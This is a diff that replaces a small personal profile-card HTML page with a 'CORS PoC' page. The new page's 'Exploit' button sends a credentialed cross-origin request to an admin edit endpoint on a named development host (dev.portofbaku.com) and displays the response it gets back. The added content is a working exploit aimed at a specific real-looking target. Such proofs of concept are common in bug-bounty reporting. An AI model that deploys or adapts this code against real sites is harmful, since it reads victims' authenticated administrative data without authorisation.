@@ -1,20 +1,22 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-    <link rel="stylesheet" href="stil.css">
-</head>
-<body>
-    <div class="card">
-        <img class="steph italic" src="https://cdn.nba.com/headshots/nba/latest/1040x760/201939.png" alt="stephen curry smiling wearing GSW jersey">
-        <div>
-            <h3>ismayilov ibrahim</h3>
-            <p>front-end developer</p>
-            <h4>ordubad</h4>
-        </div>
-    </div>
-</body>
-</html>
+<html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://dev.portofbaku.com/abI2q0N2Nl4r8Gs/admins/8/edit", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
